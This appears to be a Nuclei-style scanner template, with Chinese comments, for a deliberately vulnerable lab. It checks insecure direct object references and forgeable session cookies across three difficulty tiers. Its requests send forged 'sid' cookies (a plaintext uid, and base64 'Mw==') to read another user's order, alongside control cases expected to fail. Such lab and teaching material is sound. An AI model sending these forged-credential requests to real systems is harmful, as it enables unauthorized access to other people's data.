id: vulnlab-idor-session-credential

info:
  name: 越权 · 会话凭据可伪造
  severity: high
  author: hediwen
  tags: [idor, broken-access-control, session, authorization, credential-forgery]

  description: |
    与 idor 场景的区别：idor 问「有没有校验资源归属」，本场景问
    「服务端凭什么相信你是谁」。两件事独立 —— 归属校验写了但凭据可伪造，
    越权照样成立。

    三档对应身份凭据的三种可信度：

      low    ：`sid` 就是明文 uid。详情查询**同时**漏了归属条件
      medium ：`sid` 是 base64(uid)。SQL 正确，但「我是谁」由客户端编码决定
      high   ：`sid` 是服务端随机令牌，只能查表还原 —— 客户端造不出别的条目

    ── 为什么单独成场景 ──

    中间那种（base64 / hex / 自定义编码被当成防护）最容易被误判为
    「已做安全处理」：值不可读，看起来像加密过。但编码不需要密钥，
    任何人都能解开、改掉、再编回去。

    判别方法只有一条：**凭据里的信息，客户端能不能自己造出来。**

    ⚠️ 本检测是**只读**的 —— 只查询一条订单、只读取「刚好够证明问题」的记录。

  reference:
    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

requests:
  # ── ① low 档：详情查询缺归属条件 ────────────────────────────────
  #
  # 「我的订单」列表查询带了 user_id 条件，详情查询没有：
  #
  #     列表：SELECT * FROM orders WHERE user_id = ?
  #     详情：SELECT * FROM orders WHERE id = ?
  #
  # 同一页面、同一张表、同一条业务规则，只落地了一处。
  # 注意：这里用的凭据是**合法**的 alice（sid=2），越权不依赖伪造凭据 ——
  # 说明「缺归属校验」和「凭据可伪造」是两个独立的问题。
  - method: GET
    path:
      - "{{BaseURL}}/idor-session/low.php?order_id=1003"
    headers:
      Cookie: "sid=2"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      # 别人的订单里的凭证 —— 只在成功越权时才渲染
      - type: word
        part: body
        words:
          - "VULNLAB{session_credential_unverified}"

    extractors:
      - type: regex
        part: body
        name: leaked_owner
        regex:
          - "下单用户</b><span class=\"mono\">([^<]*)</span>"

  # ── ② medium 档：把凭据换成 base64("3") 即可冒充 bob ────────────
  #
  # 该档的 SQL 完全正确：
  #
  #     SELECT * FROM orders WHERE id = ? AND user_id = ?
  #                                                ↑ 这个值从哪来？
  #
  #     $uid = (int) base64_decode($_COOKIE['sid']);   ← 客户端编码的
  #
  # base64_decode("Mw==") === "3" —— 只是换了个写法。
  # 归属校验**正常工作了**，它只是被喂了一个假身份。
  - method: GET
    path:
      - "{{BaseURL}}/idor-session/medium.php?order_id=1003"
    headers:
      Cookie: "sid=Mw=="

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB{session_credential_unverified}"

    extractors:
      - type: regex
        part: body
        name: forged_credential
        regex:
          - "解码后的明文</b><span class=\"mono\">([^<]*)</span>"

  # ── ③ medium 档对照组：凭据无效时必须被拒（预期不命中）──────────
  #
  # 这一条守的是一个具体缺陷：曾经「未登录」和「不做归属过滤」都由同一个 null
  # 表示，结果是**伪造或失效的凭据反而能读到所有订单** —— 防护被整个绕过。
  #
  # 它不命中，说明「未登录」确实被当成无权限处理，而不是退化成「谁都能看」。
  - method: GET
    path:
      - "{{BaseURL}}/idor-session/medium.php?order_id=1003"
    headers:
      Cookie: "sid=zzz"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB{session_credential_unverified}"

  # ── ④ high 档：自己造的令牌应被拒（预期不命中）──────────────────
  #
  # 令牌里不编码任何信息，服务端只能查自己持有的表。
  # 表里没有的条目 = 未登录 —— 与凭据「看不看得懂」无关。
  - method: GET
    path:
      - "{{BaseURL}}/idor-session/high.php?order_id=1003"
    headers:
      Cookie: "sid=deadbeef0000"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB{session_credential_unverified}"

  # ── ⑤ high 档：他人的合法令牌也应被拒（预期不命中）──────────────
  #
  # 凭据合法 ≠ 能读别人的数据。归属校验和服务端解析出的身份两者都在起作用。
  # 这一条把「凭据强度」和「授权判断」两件事分开验证。
  - method: GET
    path:
      - "{{BaseURL}}/idor-session/high.php?order_id=1003"
    headers:
      Cookie: "sid=a1b2c3d4e5f6"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB{session_credential_unverified}"
